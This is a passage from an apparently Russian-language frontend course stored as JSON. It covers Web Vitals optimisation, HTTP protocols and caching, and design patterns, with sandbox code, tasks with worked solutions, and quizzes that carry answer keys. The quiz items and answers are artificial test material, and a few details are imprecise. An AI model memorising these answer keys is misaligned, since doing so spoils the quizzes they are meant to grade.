      "initialCss": "#perf-app {\n  font-family: monospace;\n  color: #e6edf3;\n  padding: 16px;\n  background: #0d1117;\n  border-radius: 8px;\n}",
      "initialJs": "const input = document.getElementById('search-input');\nconst rawEl = document.getElementById('raw-count');\nconst debEl = document.getElementById('debounced-count');\n\nlet rawCount = 0;\nlet debCount = 0;\n\nfunction debounce(fn, delay) {\n  let timer;\n  return (...args) => {\n    clearTimeout(timer);\n    timer = setTimeout(() => fn(...args), delay);\n  };\n}\n\nconst handleDebounced = debounce(() => {\n  debCount++;\n  debEl.textContent = debCount;\n}, 300);\n\ninput.addEventListener('input', () => {\n  rawCount++;\n  rawEl.textContent = rawCount;\n  handleDebounced();\n});",
      "instructions": "Практика Web Performance:\n1. Быстро напечатайте слово в инпуте и сравните счетчики\n2. Обратите внимание, как debounce сокращает число тяжелых вызовов в 5-10 раз, разгружая Main Thread\n3. Попробуйте изменить задержку debounce с 300ms на 500ms"
    },
    "task": {
      "title": "Аудит и комплексная оптимизация страницы каталога по Core Web Vitals",
      "scenario": "Страница каталога интернет-магазина провалила аудит Lighthouse (Score: 38/100): LCP равен 4.8s из-за неоптимизированного баннера, CLS составляет 0.45 из-за отсутствия размеров у карточек товаров, а поисковая строка замораживает интерфейс (INP > 600ms). Вам нужно реализовать модуль оптимизации.",
      "criteria": [
        "Реализовать HOF-утилиту debounce(fn, delayMs) для оптимизации инпута поиска",
        "Сформировать правильную HTML-разметку LCP-баннера с форматом picture (AVIF, WebP), fetchpriority='high' и явными width/height",
        "Задать CSS-правило aspect-ratio для карточек каталога для устранения CLS",
        "Написать асинхронную функцию chunkedProcessing(items, processFn, chunkSize)",
        "Соблюдать стандарты Core Web Vitals (LCP <= 2.5s, INP <= 200ms, CLS <= 0.1)"
      ],
      "starterCode": {
        "js": "// Реализуйте утилиты оптимизации производительности\nfunction debounce(fn, delayMs) {\n  // Ваш код\n}\n\nasync function chunkedProcessing(items, processFn, chunkSize = 50) {\n  // Разбивка длинной задачи\n}"
      },
      "hints": [
        "В debounce сохраняйте let timer и сбрасывайте через clearTimeout",
        "Для уступки потока используйте await new Promise(r => setTimeout(r, 0))",
        "В разметке баннера используйте <picture><source srcset='...avif' type='image/avif'><img fetchpriority='high' width='1200' height='600'>"
      ],
      "solution": {
        "js": "function debounce(fn, delayMs = 300) {\n  let timer = null;\n  return function (...args) {\n    clearTimeout(timer);\n    timer = setTimeout(() => fn.apply(this, args), delayMs);\n  };\n}\n\nasync function chunkedProcessing(items = [], processFn, chunkSize = 50) {\n  const results = [];\n  for (let i = 0; i < items.length; i += chunkSize) {\n    const chunk = items.slice(i, i + chunkSize);\n    for (const item of chunk) {\n      results.push(processFn(item));\n    }\n    // Уступка Main Thread браузеру для отрисовки кадров\n    await new Promise((resolve) => setTimeout(resolve, 0));\n  }\n  return results;\n}",
        "explanation": "debounce устраняет спам вызовов и разгружает Main Thread (улучшая INP). chunkedProcessing разбивает длинную задачу на микропакеты, предотвращая зависание интерфейса."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro5-q1",
          "question": "Отчёт по реальным пользователям показывает LCP 3.8 с, INP 150 мс, CLS 0.05. Какая метрика НЕ находится в зелёной зоне?",
          "options": [
            "Все три укладываются в норму, оптимизация здесь не требуется",
            "Только INP — порог хорошего значения составляет 100 миллисекунд",
            "LCP и CLS — оба показателя превышают допустимые границы",
            "Только LCP — порог хорошего значения составляет 2.5 секунды"
          ],
          "correctIndex": 3,
          "explanation": "Границы хорошей зоны такие: загрузка главного содержимого до 2.5 секунды, отзывчивость до 200 миллисекунд, накопленный сдвиг макета до 0.1. Отзывчивость в 150 миллисекунд и сдвиг 0.05 укладываются с запасом, а вот 3.8 секунды попадают в жёлтую зону «требует улучшения» — красной она станет после четырёх секунд."
        },
        {
          "id": "pro5-q2",
          "question": "Что именно измеряет INP и чем эта метрика отличается от прежней FID?",
          "options": [
            "Задержку до отрисовки кадра после действия, а не только время до начала обработки",
            "Время до появления первого контента; прежняя мерила время до полной загрузки",
            "Количество действий пользователя за сессию; прежняя учитывала только первое из них",
            "Длительность самой долгой задачи в основном потоке за всё время работы страницы"
          ],
          "correctIndex": 0,
          "explanation": "Прежняя метрика фиксировала лишь задержку до запуска обработчика первого взаимодействия, поэтому страница с мгновенным откликом, но медленной перерисовкой получала отличную оценку при отвратительном ощущении от работы. Новая метрика измеряет весь путь: от нажатия до момента, когда пользователь увидел результат, и берёт худшее взаимодействие за сессию, а не первое."
        },
        {
          "id": "pro5-q3",
          "question": "Главный баннер первого экрана скачивается слишком поздно и тянет вниз метрику загрузки. Что ускорит его надёжнее всего?",
          "options": [
            "Поставить `loading=\"eager\"` — это единственный доступный способ поднять приоритет",
            "Перенести тег изображения в самый конец документа, ближе к закрытию `body`",
            "Добавить `fetchpriority=\"high\"` и предзагрузку через `<link rel=\"preload\">`",
            "Заменить тег изображения на фоновое изображение, заданное в CSS-правиле"
          ],
          "correctIndex": 2,
          "explanation": "Браузер сканирует разметку заранее, но приоритет у изображений по умолчанию низкий, и баннер встаёт в очередь за скриптами и стилями. Явное указание высокого приоритета поднимает его в очереди, а предзагрузка в шапке документа запускает скачивание ещё до разбора тела. Значение `eager` лишь отключает ленивую загрузку, ничего не ускоряя, а фоновое изображение из CSS начнёт грузиться только после построения дерева стилей — то есть заметно позже."
        },
        {
          "id": "pro5-q4",
          "question": "Рекламный блок подгружается скриптом и сдвигает контент вниз. Как убрать этот сдвиг?",
          "options": [
            "Отложить загрузку блока до события полной загрузки страницы",
            "Загружать блок с `position: fixed`, чтобы он не участвовал в потоке документа",
            "Добавить плавный переход высоты, чтобы сдвиг стал визуально менее заметным",
            "Заранее зарезервировать место контейнеру фиксированной высотой или соотношением сторон"
          ],
          "correctIndex": 3,
          "explanation": "Сдвиг возникает, когда элемент появляется и раздвигает уже отрисованный контент. Единственное настоящее лечение — занять это место заранее: задать контейнеру высоту или соотношение сторон, показать на время скелетон. Откладывание загрузки не убирает сдвиг, а переносит его на более поздний момент, когда пользователь уже читает текст, — это даже хуже. Вывод блока из потока меняет вёрстку и подходит не всегда."
        },
        {
          "id": "pro5-q5",
          "question": "Обработка массива из пятидесяти тысяч элементов блокирует интерфейс почти на секунду. Что поможет?",
          "options": [
            "Обернуть вычисление в промис — код внутри выполняется вне основного потока",
            "Перенести вычисление в обработчик таймера с нулевой задержкой",
            "Вынести вычисление в Web Worker либо разбить его на части с уступкой потока",
            "Добавить свойство `will-change`, переложив нагрузку на видеокарту"
          ],
          "correctIndex": 2,
          "explanation": "Промис не создаёт потока: он лишь переносит выполнение в очередь микрозадач, и тяжёлый цикл по-прежнему держит основной поток. Таймер тоже ничего не решает — задача просто выполнится чуть позже, но так же целиком. Настоящих вариантов два: отдать вычисление отдельному потоку через Web Worker или нарезать работу на куски и периодически возвращать управление браузеру, чтобы тот успевал обрабатывать действия пользователя."
        }
      ]
    }
  },
  {
    "id": "pro-6",
    "moduleId": "pro",
    "level": 6,
    "title": "Сетевой стек и протоколы: HTTP/1.1, HTTP/2, HTTP/3, HTTPS, TLS и REST API",
    "subtitle": "TCP 3-way handshake, TLS шифрование, HTTP/2 Multiplexing, HTTP/3 QUIC/UDP, RESTful семантика и ETag кэширование",
    "description": "Освойте сетевой фундамент веба: архитектуру TCP/IP, процесс TLS-рукопожатия и HTTPS-сертификаты, эволюцию протоколов (HTTP/2 мультиплексирование, HTTP/3 поверх UDP/QUIC), семантику проектирования RESTful API (идемпотентность, статус-коды) и стратегии HTTP-кэширования (Cache-Control, ETag, 304 Not Modified).",
    "estimatedMinutes": 65,
    "difficulty": "intermediate",
    "tags": [
      "network",
      "http",
      "http2",
      "http3",
      "https",
      "tls",
      "rest-api",
      "caching",
      "etag",
      "cache-control"
    ],
    "theory": {
      "overview": "Фронтенд-приложение взаимодействует с внешним миром через сетевые протоколы. Понимание того, как устанавливается TCP-соединение, как шифруется трафик через TLS, чем HTTP/3 превосходит HTTP/2 и как настроить эффективное кэширование — ключевые навыки Senior Frontend инженера.\n\nВ этом уроке мы разберём сетевой стек от физического пакета до REST API контрактов и стратегий инвалидации кэша.",
      "sections": [
        {
          "title": "Протоколы HTTP/1.1 vs HTTP/2 vs HTTP/3 (QUIC) и безопасность TLS",
          "content": "Эволюция передачи данных в сети Интернет:\n\n1. **HTTP/1.1 (1997)**:\n- Текстовый протокол. Проблема: **Head-of-Line Blocking (Блокировка начала очереди)** — браузер может отправлять только 1 запрос за раз по одному TCP-соединению (лимит ~6 соединений на домен).\n\n2. **HTTP/2 (2015)**:\n- **Бинарный протокол** с мультиплексированием: сотни запросов и ответов передаются параллельно по **ОДНОМУ TCP-соединению** в виде независимых фреймов!\n- **Сжатие заголовков (HPACK)**: экономит до 80% оверхеда HTTP-заголовков.\n- Server Push: сервер может прислать CSS вместе с HTML.\n\n3. **HTTP/3 и протокол QUIC (2022)**:\n- Работает поверх **UDP** вместо TCP!\n- Устраняет проблему потери пакетов на уровне ОС (при потере 1 пакета TCP блокирует весь поток, QUIC перезапрашивает только потерянный поток).\n- Мгновенное 0-RTT подключение при повторных визитах.\n\n4. **HTTPS и TLS 1.3**:\n- Шифрование трафика асимметричными ключами (RSA/ECC) и симметричным сессионным AES. Защита от прослушивания и подмены данных провайдером (Man-in-the-Middle).",
          "codeExample": {
            "language": "bash",
            "code": "# Проверка протокола и TLS сертификата через curl в терминале:\ncurl -I --http2 https://api.github.com\n\n# Заголовки ответа:\nHTTP/2 200 \nserver: GitHub.com\ncontent-type: application/json; charset=utf-8\nstrict-transport-security: max-age=31536000; includeSubdomains; preload",
            "title": "Проверка поддержки HTTP/2 через терминал",
            "explanation": "HTTP/2 возвращает статус в единой строке 'HTTP/2 200' и мультиплексирует все ресурсы."
          },
          "image": {
            "src": "/images/lessons/web-network-protocols.svg",
            "alt": "Сетевой стек: HTTP/2/3, TLS и ETag кэширование",
            "caption": "Сетевые протоколы HTTP/2, HTTP/3 (QUIC), TLS-шифрование и стратегии HTTP-кэширования (ETag)"
          }
        },
        {
          "title": "RESTful API: семантика методов, статус-коды и идемпотентность",
          "content": "Проектирование чистого взаимодействия клиент-сервер:\n\n1. **Идемпотентность методов**:\n- **Идемпотентный метод** — повторный вызов запроса N раз дает ТОЧНО ТАКОЙ ЖЕ результат на сервере, как и один вызов.\n- `GET`, `PUT`, `DELETE`, `HEAD` — строго идемпотентны (удалить юзера с id=5 десять раз подряд — результат один: юзера нет).\n- `POST` — НЕ идемпотентен (10 запросов создадут 10 дубликатов заказов!).\n\n2. **Семейства статус-кодов HTTP**:\n- `2xx (Success)`: `200 OK`, `201 Created` (после POST), `204 No Content` (после DELETE).\n- `3xx (Redirection)`: `301 Moved Permanently`, `304 Not Modified` (данные взяты из кэша).\n- `4xx (Client Error)`: `400 Bad Request`, `401 Unauthorized` (нет токена), `403 Forbidden` (нет прав), `404 Not Found`, `422 Unprocessable Entity` (ошибка валидации полей), `429 Too Many Requests` (Rate Limit).\n- `5xx (Server Error)`: `500 Internal Server Error`, `502 Bad Gateway`, `503 Service Unavailable`.",
          "codeExample": {
            "language": "json",
            "code": "// Стандартный формат ошибки REST API (RFC 7807 Problem Details)\n{\n  \"type\": \"https://api.example.com/errors/validation-failed\",\n  \"title\": \"Ошибка валидации формы\",\n  \"status\": 422,\n  \"invalidParams\": [\n    { \"name\": \"email\", \"reason\": \"Некорректный формат email адреса\" },\n    { \"name\": \"password\", \"reason\": \"Пароль должен содержать минимум 8 символов\" }\n  ]\n}",
            "title": "Формат ответа об ошибке REST API по стандарту RFC 7807",
            "explanation": "Стандартизированный ответ позволяет фронтенду автоматически привязать ошибки валидации к конкретным инпутам формы."
          }
        },
        {
          "title": "HTTP-кэширование: Cache-Control, ETag, 304 Not Modified и stale-while-revalidate",
          "content": "Как браузер кэширует ресурсы без лишних запросов к сети:\n\n1. **Заголовок `Cache-Control`**:\n- `max-age=31536000, immutable` — для файлов со статическим хешем в имени (`index.a1b2c3.js`). Браузер сохраняет файл на 1 год и НИКОГДА больше не делает запрос к серверу!\n- `no-cache` — браузер сохраняет кэш, но ОБЯЗАН перед каждым показом спросить у сервера: «Изменился ли файл?»\n- `no-store` — категорический запрет на кэширование (банковские выписки, личные данные).\n\n2. **Валидация через `ETag` и `304 Not Modified`**:\n- Сервер отдает хеш контента `ETag: \"w/33a280e0\"`.\n- При следующем запросе браузер отправляет заголовок `If-None-Match: \"w/33a280e0\"`.\n- Если контент не изменился, сервер возвращает статус **`304 Not Modified` с пустым телом (0 байт)** — экономия 100% трафика!\n\n3. **Директива `stale-while-revalidate=60`**:\n- Браузер мгновенно отдает пользователю старый кэш, а в фоне тихо запрашивает свежую версию с сервера.",
          "codeExample": {
            "language": "bash",
            "code": "# Заголовки для идеального статического кэширования бандла (Vite dist):\n# 1. Для JS/CSS ассетов с хешами в имени:\nCache-Control: public, max-age=31536000, immutable\n\n# 2. Для index.html (всегда должен быть свежим!):\nCache-Control: no-cache\nETag: \"d41d8cd98f00b204e9800998ecf8427e\"",
            "title": "Золотое правило кэширования SPA: index.html vs хешированные ассеты",
            "explanation": "index.html проверяется через ETag/no-cache, а хешированные JS/CSS кэшируются намертво на 1 год через immutable."
          }
        },
        {
          "title": "Архитектурные стили API: REST vs GraphQL vs gRPC",
          "content": "Сравнение подходов клиент-серверной коммуникации:\n\n1. **REST API (Стандарт веба)**:\n- Простота, нативное HTTP-кэширование, независимость от языков.\n- Минусы: Over-fetching (сервер отдает лишние поля) и Under-fetching (нужно сделать 3 запроса для сборки 1 экрана).\n\n2. **GraphQL (Гибкость)**:\n- Клиент сам объявляет в теле запроса, какие именно поля ему нужны: `query { user { name, avatar } }`.\n- Минусы: сложнее кэшировать на уровне HTTP, оверхед парсинга схемы.\n\n3. **gRPC / Protocol Buffers (Микросервисы)**:\n- Бинарная сериализация Protobuf поверх HTTP/2 — в 7–10 раз быстрее JSON, строгая кодогенерация типов.",
          "codeExample": {
            "language": "javascript",
            "code": "// Сравнение: REST запрос vs GraphQL запрос\n\n// 1. REST: получаем всю модель пользователя (50 полей)\nconst restUser = await fetch('/api/users/1').then(r => r.json());\n\n// 2. GraphQL: запрашиваем ТОЛЬКО 2 поля (экономим мобильный трафик!)\nconst gqlQuery = `\n  query GetUser($id: ID!) {\n    user(id: $id) {\n      name\n      avatarUrl\n    }\n  }\n`;",
            "title": "Сравнение REST и GraphQL запросов",
            "explanation": "GraphQL решает проблему Over-fetching, запрашивая только необходимые для текущего экрана поля."
          }
        }
      ],
      "seniorTips": [
        "Всегда настраивайте `Cache-Control: public, max-age=31536000, immutable` для JS/CSS файлов с хешами, а для `index.html` — `no-cache`.",
        "Помните про идемпотентность: `PUT` и `DELETE` безопасны для повторных вызовов, `POST` — создает дубликаты.",
        "Используйте HTTP/2 или HTTP/3 для production — мультиплексирование устраняет проблему задержек при загрузке сотен мелких модулей.",
        "Обрабатывайте статус 304 Not Modified как успешное получение данных из локального кэша браузера."
      ],
      "commonMistakes": [
        {
          "bad": "/* Кэширование index.html на 1 год (max-age=31536000) */\n// Пользователи не увидят новый релиз, пока вручную не очистят кэш браузера!",
          "good": "/* index.html: Cache-Control: no-cache */\n// Браузер проверяет обновления перед каждым открытием сайта",
          "reason": "index.html ссылается на новые хеши файлов JS. Если закешировать index.html, сайт застрянет на старой версии навсегда."
        },
        {
          "bad": "// Использование GET-запроса для удаления записи: fetch('/api/delete-user?id=5')",
          "good": "fetch('/api/users/5', { method: 'DELETE' })",
          "reason": "Поисковые роботы (Googlebot) могут автоматически переходить по всем GET-ссылкам и случайно удалить данные в базе!"
        },
        {
          "bad": "// Игнорирование статуса 429 Too Many Requests (отсутствие паузы перед повтором)",
          "good": "// Уважение заголовка Retry-After при получении 429",
          "reason": "При получении 429 сервер блокирует запросы из-за превышения лимита. Заголовок Retry-After сообщает, сколько секунд подождать."
        }
      ],
      "keyTakeaways": [
        "HTTP/2 и HTTP/3 используют бинарное мультиплексирование, устраняя Head-of-Line Blocking.",
        "HTTPS и TLS 1.3 шифруют данные, защищая пользователей от атак Man-in-the-Middle.",
        "RESTful семантика четко разделяет идемпотентные (GET, PUT, DELETE) и неидемпотентные (POST) действия.",
        "ETag и заголовок 304 Not Modified экономят трафик, проверяя изменения без передачи тела ответа.",
        "Хешированные ассеты кэшируются на 1 год с флагом immutable, а index.html — с no-cache."
      ]
    },
    "sandbox": {
      "initialHtml": "<div id=\"network-app\">\n  <h3>Сетевой анализатор: Кэширование & ETag</h3>\n  <button id=\"btn-net-req\" style=\"background:#2dff8a; color:#0a0e13; border:none; padding:8px 16px; font-weight:bold; cursor:pointer;\">Отправить запрос GET /api/feed</button>\n  <pre id=\"net-log\" style=\"margin-top:12px; color:#e6edf3; font-size:12px; line-height:1.5; background:#161b22; padding:12px; border-radius:6px;\"></pre>\n</div>",
      "initialCss": "#network-app { font-family: monospace; color: #e6edf3; padding: 16px; background: #0d1117; border-radius: 8px; }",
      "initialJs": "const netLog = document.getElementById('net-log');\nlet hasCachedEtag = false;\n\ndocument.getElementById('btn-net-req').onclick = () => {\n  if (!hasCachedEtag) {\n    netLog.textContent = '🌐 Запрос 1 (Холодный):\\n';\n    netLog.textContent += '> GET /api/feed HTTP/2\\n';\n    netLog.textContent += '< HTTP/2 200 OK\\n';\n    netLog.textContent += '< ETag: \"v1.4.0-hash99\"\\n';\n    netLog.textContent += '< Cache-Control: no-cache\\n';\n    netLog.textContent += '< Тело ответа: 245 KB (Полная загрузка)\\n\\n';\n    hasCachedEtag = true;\n  } else {\n    netLog.textContent += '⚡ Запрос 2 (Повторный с ETag):\\n';\n    netLog.textContent += '> GET /api/feed HTTP/2\\n';\n    netLog.textContent += '> If-None-Match: \"v1.4.0-hash99\"\\n';\n    netLog.textContent += '< HTTP/2 304 Not Modified 🚀\\n';\n    netLog.textContent += '< Тело ответа: 0 байт (Мгновенно из локального кэша!)\\n';\n  }\n};",
      "instructions": "Практика с кэшированием:\n1. Нажмите кнопку первый раз — сервер вернет 200 OK и ETag (245 KB)\n2. Нажмите второй раз — браузер отправит If-None-Match, и сервер вернет 304 Not Modified (0 байт)!"
    },
    "task": {
      "title": "Разработка сетевого клиента с поддержкой ETag валидации и HTTP-кэширования",
      "scenario": "Создайте класс CachedHttpClient: клиент должен сохранять полученные ETag в память, передавать заголовок If-None-Match при повторных запросах, корректно обрабатывать ответ 304 Not Modified (возвращая сохраненные данные из кэша) и обновлять кэш при 200 OK.",
      "criteria": [
        "Клиент сохраняет полученные данные и заголовок ETag в локальный кэш Map",
        "При повторном запросе отправляется заголовок If-None-Match",
        "При получении статуса 304 Not Modified возвращаются закешированные данные",
        "При получении статуса 200 OK кэш обновляется свежими данными"
      ],
      "starterCode": {
        "js": "// Реализуйте CachedHttpClient\nclass CachedHttpClient {\n  // Ваш код\n}"
      },
      "hints": [
        "Используйте Map для хранения: this.cache.set(url, { data, etag });",
        "В заголовках: if (cached) headers['If-None-Match'] = cached.etag;",
        "if (response.status === 304) return cached.data;"
      ],
      "solution": {
        "js": "class CachedHttpClient {\n  constructor() {\n    this.cache = new Map();\n  }\n\n  async get(url) {\n    const cached = this.cache.get(url);\n    const headers = {};\n\n    if (cached && cached.etag) {\n      headers['If-None-Match'] = cached.etag;\n    }\n\n    const response = await fetch(url, { headers });\n\n    // 304 Not Modified — контент не изменился, берем из кэша\n    if (response.status === 304 && cached) {\n      console.log(`[ETag 304] Данные для ${url} взяты из кэша (0 байт трафика)`);\n      return cached.data;\n    }\n\n    if (!response.ok) {\n      throw new Error(`HTTP Error ${response.status}`);\n    }\n\n    const data = await response.json();\n    const etag = response.headers.get('ETag');\n\n    if (etag) {\n      this.cache.set(url, { data, etag });\n    }\n\n    return data;\n  }\n}\n\nconsole.log('CachedHttpClient успешно инициализирован');",
        "explanation": "CachedHttpClient экономит трафик и ускоряет работу за счет нативной поддержки валидации кэша через ETag и статус 304."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro6-q1",
          "question": "Что устраняет мультиплексирование в HTTP/2 по сравнению с HTTP/1.1?",
          "options": [
            "Необходимость шифрования: соединение становится защищённым и без TLS",
            "Лимит в шесть параллельных соединений и очередь запросов внутри соединения",
            "Необходимость кеширования: ресурсы больше не нужно хранить на стороне клиента",
            "Зависимость от DNS: адрес сервера передаётся прямо в заголовке запроса"
          ],
          "correctIndex": 1,
          "explanation": "В HTTP/1.1 по одному соединению запросы идут строго по очереди, а браузер держит к домену не больше шести соединений — отсюда старые приёмы вроде склейки спрайтов и раздачи файлов с разных поддоменов. HTTP/2 передаёт множество независимых потоков по одному соединению, перемежая их кадры, поэтому сотня мелких модулей загружается без очереди. Шифрование на практике идёт рядом, но это отдельный уровень."
        },
        {
          "id": "pro6-q2",
          "question": "Что означает такой обмен между браузером и сервером?",
          "codeSnippet": "GET /api/products\nIf-None-Match: \"a1b2c3\"\n\nHTTP/1.1 304 Not Modified\nETag: \"a1b2c3\"",
          "options": [
            "Ресурс удалён с сервера, и клиенту следует очистить свою локальную копию",
            "Требуется повторная авторизация: переданная метка устарела и отклонена",
            "Данные не изменились: тело не передаётся, браузер берёт ответ из кеша",
            "Сервер перегружен и просит повторить запрос позже с той же самой меткой"
          ],
          "correctIndex": 2,
          "explanation": "Метка ресурса — отпечаток его содержимого. Браузер отправляет сохранённое значение, сервер сравнивает его с текущим и, если совпало, отвечает коротким статусом без тела. Передаются только заголовки, то есть сотни байт вместо мегабайта, а браузер отдаёт коду уже имеющуюся копию. Для приложения это полноценный успешный ответ."
        },
        {
          "id": "pro6-q3",
          "question": "Запрос не дошёл из-за обрыва сети, и клиент собирается его повторить. Какой метод повторять безопасно?",
          "options": [
            "`PUT` — повторный вызов приводит ресурс ровно к тому же состоянию, что и первый",
            "`POST` — сервер сам распознаёт дубликаты по содержимому тела запроса",
            "Любой: протокол гарантирует однократную доставку каждого отправленного запроса",
            "Ни один: повтор запроса всегда требует явного подтверждения пользователем"
          ],
          "correctIndex": 0,
          "explanation": "Идемпотентность означает, что повторение запроса не меняет итогового состояния: полная замена ресурса, его удаление и чтение обладают этим свойством. Создание ресурса — нет, и повтор породит второй заказ или второй платёж. Никакой автоматической защиты от дубликатов протокол не даёт: её реализуют вручную через ключ идемпотентности, который клиент передаёт в заголовке."
        },
        {
          "id": "pro6-q4",
          "question": "Как настроить кеширование для `index.html` и для собранного файла `app.4f2a1b.js`?",
          "options": [
            "Обоим год кеширования: имена файлов всё равно содержат хеш их содержимого",
            "HTML — обязательная проверка свежести, скрипту с хешем — год и признак неизменности",
            "Обоим запрет хранения: страница должна каждый раз приходить прямо с сервера",
            "HTML — год кеширования, а скрипту — проверка свежести при каждом запросе"
          ],
          "correctIndex": 1,
          "explanation": "Имя собранного файла содержит хеш содержимого, поэтому при любом изменении кода меняется и адрес — старый файл можно кешировать хоть на год и не проверять вовсе. А вот входной документ ссылается на эти имена: закешировав его надолго, вы навсегда запрёте пользователя на старой версии приложения. Поэтому он отдаётся с обязательной проверкой свежести, что при неизменном содержимом стоит одного короткого ответа без тела."
        },
        {
          "id": "pro6-q5",
          "question": "Зачем HTTP/3 перешёл с TCP на UDP?",
          "options": [
            "UDP быстрее, поскольку вообще не проверяет факт доставки отправленных пакетов",
            "UDP не требует рукопожатия, поэтому соединение вообще не приходится устанавливать",
            "TCP не поддерживает шифрование, а поверх UDP можно применить протокол TLS 1.3",
            "Потеря пакета в TCP тормозит все потоки; QUIC поверх UDP изолирует потоки друг от друга"
          ],
          "correctIndex": 3,
          "explanation": "Мультиплексирование в HTTP/2 решило проблему очереди на уровне протокола, но не на уровне транспорта: TCP гарантирует порядок байтов, и один потерянный пакет задерживает данные всех потоков сразу. QUIC строит собственную логику надёжности поверх UDP, где потери в одном потоке не влияют на остальные. Заодно рукопожатие сокращается, а шифрование встроено в протокол, а не надстроено сверху."
        }
      ]
    }
  },
  {
    "id": "pro-7",
    "moduleId": "pro",
    "level": 7,
    "title": "Паттерны проектирования в JavaScript и архитектура компонентов",
    "subtitle": "Singleton, Factory, Observer/PubSub, Proxy (Реактивность), Strategy, Compound Components и Custom Hooks",
    "description": "Освойте ключевые паттерны проектирования (Design Patterns) в контексте современного фронтенда: порождающие и поведенческие паттерны GoF (Singleton, Factory, Observer, PubSub, Proxy, Strategy), архитектурные паттерны компонентов React (Compound Components, Render Props, Custom Hooks) и построение слабосвязанных модулей.",
    "estimatedMinutes": 65,
    "difficulty": "intermediate",
    "tags": [
      "design-patterns",
      "singleton",
      "factory",
      "observer",
      "pubsub",
      "proxy",
      "strategy",
      "compound-components",
      "custom-hooks"
    ],
    "theory": {
      "overview": "Паттерны проектирования — это проверенные временем архитектурные рецепты решения типовых задач разработки. Знание паттернов позволяет писать код, который легко масштабировать, тестировать и повторно использовать без «костылей».\n\nВ этом уроке мы разберём классические паттерны Gang of Four (GoF) в адаптации под JavaScript, поймем, как устроен паттерн **Proxy и реактивность**, и научимся создавать гибкие UI-компоненты через паттерн **Compound Components**.",
      "sections": [
        {
          "title": "Паттерны Singleton, Factory и Strategy в JavaScript",
          "content": "Классические порождающие и поведенческие паттерны:\n\n1. **Singleton (Одиночка)**:\n- Гарантирует наличие ровно ОДНОГО экземпляра класса на все приложение и глобальную точку доступа к нему.\n- Применение: `ApiClient`, `WebSocketManager`, `AnalyticsService`.\n- В JavaScript ES-модулях любой `export const apiClient = new ApiClient();` автоматически является нативным синглтоном!\n\n2. **Factory (Фабрика)**:\n- Создает объекты, скрывая конкретную логику инстанцирования за единым интерфейсом.\n- Применение: фабрика уведомлений (`NotificationFactory.create('toast' | 'modal' | 'banner')`).\n\n3. **Strategy (Стратегия)**:\n- Определяет семейство алгоритмов, инкапсулирует каждый из них и делает их взаимозаменяемыми.\n- Применение: стратегии оплаты (`CardPayment`, `SbpPayment`, `CryptoPayment`) или стратегии валидации полей формы.",
          "image": {
            "src": "/images/lessons/web-js-design-patterns.svg",
            "alt": "Паттерны проектирования в JavaScript и React",
            "caption": "Паттерны Singleton, Factory, PubSub, Proxy (реактивность) и архитектура Compound Components"
          },
          "codeExample": {
            "language": "typescript",
            "code": "// Паттерн Strategy: стратегии оплаты в интернет-магазине\ninterface PaymentStrategy {\n  pay(amount: number): Promise<{ success: boolean; txId: string }>;\n}\n\nexport const cardPayment: PaymentStrategy = {\n  async pay(amount) { return { success: true, txId: `card_${Date.now()}` }; }\n};\n\nexport const sbpPayment: PaymentStrategy = {\n  async pay(amount) { return { success: true, txId: `sbp_${Date.now()}` }; }\n};\n\n// Контекст оплаты не зависит от конкретного банка\nexport class CheckoutProcessor {\n  constructor(private strategy: PaymentStrategy) {}\n  \n  setStrategy(strategy: PaymentStrategy) { this.strategy = strategy; }\n  \n  async processOrder(total: number) {\n    console.log(`Списание ${total} ₽...`);\n    return this.strategy.pay(total);\n  }\n}",
            "title": "Паттерн Strategy для гибких способов оплаты",
            "explanation": "Новый способ оплаты (например, СБП или СберPay) добавляется как новый объект без изменения CheckoutProcessor."
          }
        },
        {
          "title": "Паттерны Observer (Наблюдатель) и PubSub (Издатель-Подписчик)",
          "content": "Фундамент реактивного программирования и слабой связности (Loose Coupling):\n\n1. **Observer (Наблюдатель)**:\n- Объект (Subject) хранит список подписчиков и автоматически уведомляет их при изменении своего состояния через вызов метода `notify()`.\n\n2. **PubSub (Publish-Subscribe / Event Bus)**:\n- Издатель и Подписчик **вообще не знают друг о друге**! Они общаются через промежуточный брокер событий (Event Channel / Event Emitter).\n- Модуль A публикует событие `events.emit('user:login', user)`.\n- Модуль Б (корзина) и Модуль В (чат) слушают это событие независимо.\n- Преимущество: полное отсутствие прямой зависимости между модулями.",
          "codeExample": {
            "language": "typescript",
            "code": "// Реализация универсального брокера событий (PubSub Event Bus)\ntype Callback<T = any> = (data: T) => void;\n\nexport class EventEmitter {\n  private events = new Map<string, Set<Callback>>();\n\n  subscribe<T>(event: string, callback: Callback<T>): () => void {\n    if (!this.events.has(event)) {\n      this.events.set(event, new Set());\n    }\n    this.events.get(event)!.add(callback);\n    \n    // Возвращаем функцию отписки для предотвращения утечек памяти!\n    return () => this.events.get(event)?.delete(callback);\n  }\n\n  emit<T>(event: string, data: T): void {\n    this.events.get(event)?.forEach((cb) => cb(data));\n  }\n}\n\n// Использование:\nexport const globalEvents = new EventEmitter();\n// Подписка: const unsubscribe = globalEvents.subscribe('cart:update', count => renderBadge(count));\n// Публикация: globalEvents.emit('cart:update', 5);",
            "title": "Универсальный PubSub Event Bus с функцией отписки",
            "explanation": "Функция отписки (unsubscribe) гарантирует чистоту памяти при размонтировании UI-компонентов."
          }
        },
        {
          "title": "Proxy и Механизм Реактивности (как устроен Vue 3 и MobX)",
          "content": "Паттерн Proxy в стандарте ES6:\n\n1. **Объект `Proxy`**:\n- Позволяет обернуть любой объект и перехватывать базовые операции: чтение свойств (`get`), запись (`set`), удаление (`deleteProperty`).\n\n2. **Как работает реактивность**:\n- При вызове `get` — Proxy запоминает, какая функция или компонент прочитал это поле (Dependency Tracking).\n- При вызове `set` — Proxy автоматически вызывает перерисовку всех подписанных компонентов!\n- Именно на Proxy построена реактивность во **Vue 3, MobX, SolidJS и Zustand/Immer**.",
          "codeExample": {
            "language": "javascript",
